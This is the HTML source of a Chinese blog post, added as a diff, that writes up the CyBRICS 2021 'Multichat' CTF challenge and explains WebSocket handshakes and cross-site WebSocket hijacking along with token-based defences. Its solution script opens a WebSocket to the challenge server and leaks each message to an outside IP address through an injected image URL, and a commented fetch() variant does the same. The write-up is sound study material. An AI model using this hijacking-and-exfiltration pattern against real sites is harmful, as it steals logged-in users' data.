@@ -1,0 +1,510 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>cybics - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/4.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="cybics">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-07-28 12:46" pubdate>
+        2021年7月28日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      35
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">cybics</h1>
+            
+            <div class="markdown-body">
+              <h1 id="Multichat"><a href="#Multichat" class="headerlink" title="Multichat"></a>Multichat</h1><p>​    题目考的是webscoket有关的漏洞，也属于是知识盲区了…</p>
+<h3 id="关于websocket"><a href="#关于websocket" class="headerlink" title="关于websocket"></a>关于websocket</h3><h4 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h4><blockquote>
+<p>websocket用的是ws://和 wss://，那么 WebSocket 和 HTTP 是什么关系呢。WebSocket 是 HTML5  推出的新协议，跟 HTTP 协议内容本身没有关系。WebSocket 是持久化的协议，而 HTTP  是非持久连接。WebSocket 提供了全双工沟通，俗称 Web 的 TCP 连接，但 TCP 通常处理字节流（跟消息无关），而  WebSocket 基于 TCP 实现了消息流。WebSocket 也类似于 TCP 一样进行握手连接，跟 TCP 不同的是，WebSocket 是基于 HTTP 协议进行的握手。</p>
+</blockquote>
+<p>看一个请求报文</p>
+<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">GET ws:<span class="hljs-comment">//echo.websocket.org/?encoding=text HTTP/1.1</span><br>Host: echo.websocket.org<br>Connection: Upgrade<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade: websocket<br>Origin: http:<span class="hljs-comment">//www.websocket.org</span><br>Sec-WebSocket-Version: <span class="hljs-number">13</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10_11_4</span>) Chrome/<span class="hljs-number">49.0</span><span class="hljs-number">.2623</span><span class="hljs-number">.110</span><br>Accept-Encoding: gzip, deflate, sdch<br>Accept-Language: en-US,en;q=<span class="hljs-number">0.8</span>,zh-CN;q=<span class="hljs-number">0.6</span><br>Cookie: _gat=<span class="hljs-number">1</span>; _ga=GA1<span class="hljs-number">.2</span><span class="hljs-number">.2904372</span><span class="hljs-number">.1459647651</span>; JSESSIONID=1A9431CF043F851E0356F5837845B2EC<br>Sec-WebSocket-Key: 7ARps0AjsHN8bx5dCI1KKQ==<br>Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits<br></code></pre></div></td></tr></table></figure>
+
+<p>响应</p>
+<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">101</span> Web Socket Protocol Handshake<br>Access-Control-Allow-Credentials: <span class="hljs-literal">true</span><br>Access-Control-Allow-Headers: content-type<br>Access-Control-Allow-Headers: authorization<br>Access-Control-Allow-Headers: x-websocket-extensions<br>Access-Control-Allow-Headers: x-websocket-version<br>Access-Control-Allow-Headers: x-websocket-protocol<br>Access-Control-Allow-Origin: http:<span class="hljs-comment">//www.websocket.org</span><br>Connection: Upgrade<br><span class="hljs-built_in">Date</span>: Sun, <span class="hljs-number">03</span> Apr <span class="hljs-number">2016</span> <span class="hljs-number">03</span>:<span class="hljs-number">09</span>:<span class="hljs-number">21</span> GMT<br>Sec-WebSocket-Accept: wW9Bl95VtfJDbpHdfivy7csOaDo=<br>Server: Kaazing Gateway<br>Upgrade: websocket<br></code></pre></div></td></tr></table></figure>
+
+
+
+<p>核心在<code>Connection：Upgrade 和 Upgrade：websocket 两行。这两行相当于告诉服务器端：我要申请切换到 WebSocket 协议。</code></p>
+<p>一旦服务器端返回 101 响应，即可完成 WebSocket 协议切换。服务器端即可以基于相同端口，将通信协议从 http://或 https://切换到 ws://或 wss://。</p>
+<p>报文中也有和cookie类似的<code>Sec-WebSocket-Key</code>,这是一个散列key，经过了base64编码，服务器则会将一个 GUID 和这个客户端的随机数一起生成一个散列 Key 作为 Sec-WebSocket-Accept 返回给客户端。这个工作机制可以用来避免缓存代理（caching proxy），也可以用来避免请求重播（request replay）。</p>
+<p>对于<code>Access-Control-Allow-Headers</code>,以“Sec-”开头的 Header 可以避免被浏览器脚本读取到，这样攻击者就不能利用 XMLHttpRequest 伪造 WebSocket 请求来执行跨协议攻击，因为 XMLHttpRequest 接口不允许设置 Sec-开头的 Header。</p>
+<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p>支持双向通信，实时性更强。</p>
+<p>更好的二进制支持。</p>
+<p>较少的控制开销。连接创建后，ws客户端、服务端进行数据交换时，协议控制的数据包头部较小。在不包含头部的情况下，服务端到客户端的包头只有2~10字节(取决于数据包长度)，客户端到服务端的话，需要加上额外4字节的掩码。而HTTP协议每次通信都需要携带完整的头部。</p>
+<p>支持扩展。ws协议定义了扩展，用户可以扩展协议，或者实现自定义的子协议。(比如支持自定义压缩算法等)</p>
+<h3 id="跨站点-WebSocket-劫持漏洞原理"><a href="#跨站点-WebSocket-劫持漏洞原理" class="headerlink" title="跨站点 WebSocket 劫持漏洞原理"></a>跨站点 WebSocket 劫持漏洞原理</h3><p>看了对于这个的介绍，感觉和CSRF确实有些像，但又有些根本上的区别，CSRF只是通过恶意网站或者其他方法伪造客户进行请求，不会导致信息泄漏问题，也不会窃听到整个消息通道和修改服务器数据。</p>
+<h4 id="什么是跨站点-WebSocket-劫持漏洞"><a href="#什么是跨站点-WebSocket-劫持漏洞" class="headerlink" title="什么是跨站点 WebSocket 劫持漏洞"></a>什么是跨站点 WebSocket 劫持漏洞</h4><p>看看上面的报文，可以发现Cookie 头部把域名下的 Cookie 都发送到服务器端。其实WebSocket协议并没有规定服务器在握手时应该如何确认客户端的身份，服务器可以采用任何 HTTP 服务器的客户端身份认证机制，譬如 cookie，HTTP 基础认证，TLS 身份认证等。看到这，都可以联想到CSRF来绕过身份认证获得握手，其实大致过程也和CSRF差不多。</p>
+<blockquote>
+<p>因为 WebSocket 的客户端不仅仅局限于浏览器，因此 WebSocket 规范没有规范 Origin 必须相同（有兴趣的读者可以阅读规范  10.2 章节了解对于 Origin 的规范）。所有的浏览器都会发送 Origin 请求头，如果服务器端没有针对 Origin  头部进行验证可能会导致跨站点 WebSocket  劫持攻击。譬如，某个用户已经登录了应用程序，如果他被诱骗访问某个社交网站的恶意网页，恶意网页在某元素中植入一个 WebSocket  握手请求申请跟目标应用建立 WebSocket 连接。一旦打开该恶意网页，则自动发起如下请求。请注意，Origin 和  Sec-WebSocket-Key 都是由浏览器自动生成，Cookie  等身份认证参数也都是由浏览器自动上传到目标应用服务器端。如果服务器端疏于检查 Origin，该请求则会成功握手切换到 WebSocket  协议，恶意网页就可以成功绕过身份认证连接到 WebSocket  服务器，进而窃取到服务器端发来的信息，抑或发送伪造信息到服务器端篡改服务器端数据。</p>
+</blockquote>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><blockquote>
+<p>WebSocket 令牌机制</p>
+</blockquote>
+<p>以上看起来很美好，但是仅仅检查 Origin 远远不够，别忘记了，如果 WebSocket  的客户端不是浏览器，非浏览器的客户端发来的请求根本就没有 Origin。除此之外，我们要记得，恶意网页是可以伪造 Origin  头信息的。更彻底的解决方案还是要借鉴 CSRF 的解决方案－令牌机制。</p>
+<p> 鉴于篇幅原因，笔者就不详细贴出整个设计和代码，建议读者参照以下概要设计提高 WebSocket 应用的安全。</p>
+<p> \1. 服务器端为每个 WebSocket 客户端生成唯一的一次性 Token；</p>
+<p> \2. 客户端将 Token 作为 WebSocket 连接 URL 的参数（譬如 ws://echo.websocket.org/?token＝randomOneTimeToken），发送到服务器端进行 WebSocket 握手连接；</p>
+<p> \3. 服务器端验证 Token 是否正确，一旦正确则将这个 Token 标示为废弃不再重用，同时确认 WebSocket 握手连接成功；如果 Token 验证失败或者身份认证失败，则返回 403 错误。</p>
+<p> 这个方案里的 Token 设计是关键，笔者推荐的方案是为登录用户生成一个 Secure Random 存储在 Session  中，然后利用对称加密（譬如 AES GCM）加密这个 Secure Random 值作为令牌，将加密后的令牌发送给客户端用来进行连接。这样每个  Session 有一个唯一的随机数，每个随机数可以通过对称加密生成若干份一次性令牌。用户即便通过不同终端通过 WebSocket  连接到服务器，服务器可以在保障令牌唯一且一次性使用的前提下，依然能将不同通道中的信息关联到同一用户中。</p>
+<p> 可能存在另外一个设计思路，在 WebSocket 消息中增加令牌和身份信息，但笔者觉得这样的设计有悖于 WebSocket 的设计思想，而且增加了不必要的网络负载。抛砖引玉，欢迎读者提供更好的设计方案。</p>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hsany330/article/details/49823495?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.base&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.base">https://blog.csdn.net/hsany330/article/details/49823495?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-4.base&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-4.base</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cuixiping/article/details/70048611">https://blog.csdn.net/cuixiping/article/details/70048611</a></p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>进入就是一个聊天框，也比较符合WebSocket正常的功能。F12先看一眼，看到了一串javascript脚本</p>
+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> conn;<br><span class="hljs-keyword">var</span> sended_message = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRandomInt</span>(<span class="hljs-params">min, max</span>) </span>&#123;<br>    min = <span class="hljs-built_in">Math</span>.ceil(min);<br>    max = <span class="hljs-built_in">Math</span>.floor(max);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * (max - min) + min); <span class="hljs-comment">//The maximum is exclusive and the minimum is inclusive</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">appendLog</span>(<span class="hljs-params">item</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> escaped = $(<span class="hljs-string">&quot;&lt;div&gt;&quot;</span>).text(item).html();<br>    <span class="hljs-keyword">if</span> (item === sended_message) &#123;<br>        log.innerHTML += <span class="hljs-string">&#x27;&lt;div class=&quot;chat-message-right pb-4&quot;&gt;&lt;div class=&quot;flex-shrink-1 bg-light rounded py-2 px-3 mr-3&quot;&gt;&lt;div class=&quot;font-weight-bold mb-1&quot;&gt;You&lt;/div&gt;&#x27;</span> +<br>            escaped + <span class="hljs-string">&#x27;&lt;/div&gt;&lt;/div&gt;&#x27;</span>;<br>        sended_message = <span class="hljs-string">&quot;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        log.innerHTML += <span class="hljs-string">&#x27;&lt;div class=&quot;chat-message-left pb-4&quot;&gt;&lt;div class=&quot;flex-shrink-1 bg-light rounded py-2 px-3 mr-3&quot;&gt;&#x27;</span> +<br>            escaped + <span class="hljs-string">&#x27;&lt;/div&gt;&lt;/div&gt;&#x27;</span>;<br>    &#125;<br>    log.scrollTop = log.scrollHeight;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">let</span> room = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;room&quot;</span>).value;<br>    <span class="hljs-built_in">document</span>.cookie = <span class="hljs-string">&#x27;room=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(room);<br>    $(<span class="hljs-string">&quot;form input&quot;</span>).prop( <span class="hljs-string">&quot;disabled&quot;</span>, <span class="hljs-literal">false</span> );<br>    $(<span class="hljs-string">&quot;#room&quot;</span>).hide();<br>    $(<span class="hljs-string">&quot;#room&quot;</span>).parent().children().first().text(<span class="hljs-string">&quot;Room &quot;</span> + room);<br><br>    $(<span class="hljs-string">&quot;#connectButton&quot;</span>).hide();<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>[<span class="hljs-string">&quot;WebSocket&quot;</span>]) &#123;<br>        conn = <span class="hljs-keyword">new</span> WebSocket(<span class="hljs-string">&quot;ws://multichat-cybrics2021.ctf.su/ws&quot;</span>);<br>        conn.onclose = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> item = <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">if</span> (evt.code === <span class="hljs-number">1003</span>) &#123;<br>                item = <span class="hljs-string">`Status: <span class="hljs-subst">$&#123;evt.reason&#125;</span>`</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                item = <span class="hljs-string">&quot;Connection closed.&quot;</span>;<br>            &#125;<br>            appendLog(item);<br>        &#125;;<br>        conn.onopen = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;<br>            appendLog(<span class="hljs-string">&quot;Connected&quot;</span>);<br>        &#125;;<br>        conn.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;<br>            appendLog(evt.data);<br>        &#125;;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        appendLog(<span class="hljs-string">&quot;Your browser does not support WebSockets.&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> room = getRandomInt(<span class="hljs-number">1000</span>, <span class="hljs-number">9999999999</span>);<br>    <span class="hljs-keyword">var</span> msg = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;msg&quot;</span>);<br>    <span class="hljs-keyword">var</span> log = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;log&quot;</span>);<br><br>    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;form&quot;</span>).onsubmit = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!conn) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!msg.value) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        conn.send(msg.value);<br>        sended_message = msg.value;<br>        msg.value = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;;<br><br>    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;room&quot;</span>).value = room;<br>&#125;;<br></code></pre></div></td></tr></table></figure>
+
+
+
+<p>大致过程就是 先生成了一个随机数当作房间号，然后实现了消息接收发送在前端的显示，然后实现了WebSocket连接来接受和发送消息。看题目意思最开始还觉得要找到秘密的房间号，但看到随机生成的范围就不太可能了。后面有大佬出了，看了下exp才知道咋做了。</p>
+<p>因为题目还给了一个电话的按钮，可以访问url并且可以发送问题，按题目描述应该就是通过这个电话来伪造技术支持发送<code>Hey, i forgot the flag. Can you remind me?</code>来获取flag</p>
+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;script&gt;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">appendLog</span>(<span class="hljs-params">msg</span>)</span>&#123;<br>		<span class="hljs-built_in">document</span>.write(<span class="hljs-string">`&lt;img src=http://39.107.239.30:80/a=<span class="hljs-subst">$&#123;<span class="hljs-built_in">escape</span>(msg)&#125;</span>&gt;&lt;/img&gt;`</span>);<br>   		<span class="hljs-comment">//还可以const logger = (a) =&gt; &#123;</span><br>        <span class="hljs-comment">//			fetch(`http://39.107.239.30:80/?q=$&#123;encodeURI(a)&#125;`);</span><br>        <span class="hljs-comment">// 	&#125;;</span><br>	&#125;<br>	ws = <span class="hljs-keyword">new</span> WebSocket ( <span class="hljs-string">&quot;ws://multichat-cybrics2021.ctf.su/ws&quot;</span>);<br>    ws.onclose = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">evt</span>)</span>&#123;<br>        <span class="hljs-keyword">var</span> item = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span> (evt.code == <span class="hljs-number">1003</span>)&#123;<br>            item = <span class="hljs-string">`status: <span class="hljs-subst">$&#123;evt.reason&#125;</span>`</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            item = <span class="hljs-string">&quot;Connection closed.&quot;</span>;<br>        &#125;<br>        appendLog(item);<br>    &#125;;<br>	ws.onopen = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>)</span>&#123;<br>        appendLog (<span class="hljs-string">&quot;Connected&quot;</span>);          <br>		ws.send( <span class="hljs-string">&quot;Hey, i forgot the flag. Can you remind me?&quot;</span>);<br>    &#125;;<br>    ws.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;<br>    	appendLog(evt.data)<br>    &#125;;<br>&lt;/script&gt;<br><br></code></pre></div></td></tr></table></figure>
+
+
+
+<p>然后在自己vps上挂上exp，用电话访问即可。</p>
+<p><img src="https://img-blog.csdnimg.cn/12c3f57885114411bfe1c4bf702f5ce7.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>现在感觉对于一些漏洞的学习，还是得注重理解原理而不是仅仅把题做出来，回头再看CSRF得漏洞等，发现以前对它得理解还是太浅了，结合WebSocket现在感觉理解更深了，对于用户身份得伪造是一个核心问题，任何漏洞都有着核心的利用思想，这个思想也可以用到其他得地方，应该多注重这些思想得积累，以后在看到某些协议或者可利用漏洞时，应注重思考这些漏洞的思想在哪，融会贯通才是最重要的。</p>
+<p>今天再接着看看强网杯hardxss的预期解。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/07/23/2021-7-23-QWB_Hardxss%E5%A4%8D%E7%8E%B0/">
+                        <span class="hidden-mobile">QWB_Hardxss</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
